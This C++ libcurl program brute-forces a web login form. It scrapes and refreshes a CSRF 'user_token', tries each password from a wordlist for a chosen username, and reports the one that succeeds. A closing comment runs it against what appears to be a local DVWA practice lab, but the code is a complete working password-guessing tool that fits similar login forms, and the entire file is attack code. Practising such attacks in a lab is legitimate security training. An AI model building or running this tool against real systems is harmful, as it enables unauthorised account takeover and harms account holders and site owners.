#include <curl/curl.h>
#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cctype>

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t total = size * nmemb;
    std::string* s = static_cast<std::string*>(userp);
    s->append(static_cast<char*>(contents), total);
    return total;
}

static std::string to_lower(const std::string& s) {
    std::string out = s;
    std::transform(out.begin(), out.end(), out.begin(), [](unsigned char c){ return std::tolower(c); });
    return out;
}

static bool extract_user_token(const std::string& html, std::string& token_out) {
    std::smatch m;
    std::regex re(R"(<input[^>]*name=['"]user_token['"][^>]*value=['"]([^'"]+)['"][^>]*>)", std::regex::icase);
    if (std::regex_search(html, m, re) && m.size() > 1) {
        token_out = m[1].str();
        return true;
    }
    std::regex re2(R"(name=['"]?user_token['"]?[^>]*value=['"]?([^'\"\s>]+)['"]?)", std::regex::icase);
    if (std::regex_search(html, m, re2) && m.size() > 1) {
        token_out = m[1].str();
        return true;
    }
    return false;
}

static bool is_login_success(const std::string& html, long http_code)
{
    if (http_code != 200) return false;

    std::string lc = to_lower(html);

    static const std::vector<std::string> failure_phrases = {
        "invalid credentials",
        "username required",
        "account locked",
        "too many requests"
    };

    for (const auto &p : failure_phrases) {
        if (lc.find(p) != std::string::npos) return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <base_login_url> <wordlist.txt> <username> [delay_seconds]\n";
        return 1;
    }

    std::string base_url = argv[1]; 
    std::string wordlist_file = argv[2];
    std::string username = argv[3];
    double delay_secs = 1.0;
    if (argc >= 5) delay_secs = std::stod(argv[4]);

    std::ifstream infile(wordlist_file);
    if (!infile) {
        std::cerr << "Cannot open wordlist file: " << wordlist_file << "\n";
        return 1;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl_easy_init failed\n";
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_COOKIEFILE, ""); 
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Local-Auth-Bruteforce/1.0");

    std::string token;
    auto get_form = [&]()->bool {
        std::string resp;
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_URL, base_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "[GET] curl error: " << curl_easy_strerror(res) << "\n";
            return false;
        }
        std::string new_token;
        if (!extract_user_token(resp, new_token)) {
            std::cerr << "[GET] failed to extract user_token from form response.\n";
            return false;
        }
        token = new_token;
        return true;
    };

    if (!get_form()) {
        std::cerr << "Initial GET failed. Make sure server is up and URL is correct (trailing slash!).\n";
        curl_easy_cleanup(curl);
        return 1;
    }
    std::cout << "Obtained token: " << token << "\n";

    std::string password;
    int attempt = 0;
    bool found = false;
    while (std::getline(infile, password)) {
        if (password.empty()) continue;
        ++attempt;
        std::cout << "[" << attempt << "] trying password: '" << password << "'\n";

        char* esc_user = curl_easy_escape(curl, username.c_str(), 0);
        char* esc_pass = curl_easy_escape(curl, password.c_str(), 0);
        char* esc_token = curl_easy_escape(curl, token.c_str(), 0);

        std::string query = "username=" + std::string(esc_user?esc_user:"")
                          + "&password=" + std::string(esc_pass?esc_pass:"")
                          + "&user_token=" + std::string(esc_token?esc_token:"")
                          + "&Login=Login";

        if (esc_user) curl_free(esc_user);
        if (esc_pass) curl_free(esc_pass);
        if (esc_token) curl_free(esc_token);

        std::string full_url = base_url + "?" + query;

        std::string resp;
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_URL, full_url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);

        CURLcode res = curl_easy_perform(curl);
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

        if (res != CURLE_OK) {
            std::cerr << "[" << attempt << "] curl error: " << curl_easy_strerror(res) << "\n";
            std::this_thread::sleep_for(std::chrono::duration<double>(delay_secs));
            continue;
        }

        if (is_login_success(resp, http_code)) {
            std::cout << "SUCCESS with password: '" << password << "'\n";
            found = true;
            break;
        }

        std::string lc = to_lower(resp);
        if (http_code == 403 || lc.find("invalid session token") != std::string::npos
            || lc.find("expired session") != std::string::npos || lc.find("reload the form") != std::string::npos) {
            std::cout << "Token invalid/expired. Refreshing token and retrying same password...\n";
            if (!get_form()) {
                std::cerr << "Failed to refresh token.\n";
                break;
            }

            --attempt;

            char* esc_token2 = curl_easy_escape(curl, token.c_str(), 0);
            std::string query2 = "username=" + std::string(curl_easy_escape(curl, username.c_str(), 0) ? curl_easy_escape(curl, username.c_str(), 0) : "")
                                + "&password=" + std::string(curl_easy_escape(curl, password.c_str(), 0) ? curl_easy_escape(curl, password.c_str(), 0) : "")
                                + "&user_token=" + std::string(esc_token2?esc_token2:"")
                                + "&Login=Login";
            if (esc_token2) curl_free(esc_token2);
            std::string full_url2 = base_url + "?" + query2;
            std::string resp2;
            curl_easy_setopt(curl, CURLOPT_URL, full_url2.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp2);
            res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            if (res == CURLE_OK && is_login_success(resp2, http_code)) {
                std::cout << "SUCCESS (after token refresh) with password: '" << password << "'\n";
                found = true;
                break;
            }
        }

        if (http_code == 429 || lc.find("too many requests") != std::string::npos
            || lc.find("temporarily locked") != std::string::npos
            || lc.find("account temporarily locked") != std::string::npos) {
            std::cerr << "Server indicated rate limit or lockout (http " << http_code << "). Stopping.\n";
            std::cerr << "Response snippet: " << (resp.size() > 200 ? resp.substr(0,200) : resp) << "\n";
            break;
        }

        std::cout << "failed\n";
        std::this_thread::sleep_for(std::chrono::duration<double>(delay_secs));
    }

    if (!found) {
        std::cout << "Finished wordlist. Password not found (or detection failed).\n";
    }

    curl_easy_cleanup(curl);
    infile.close();
    return 0;
}

// g++ get_bruteforce.cpp -o test_brutforce -lcurl -std=c++17 -pthread
// ./test_brutforce "http://127.0.0.1:8080/vulnerabilities/brute/" wordlist.txt admin 0.8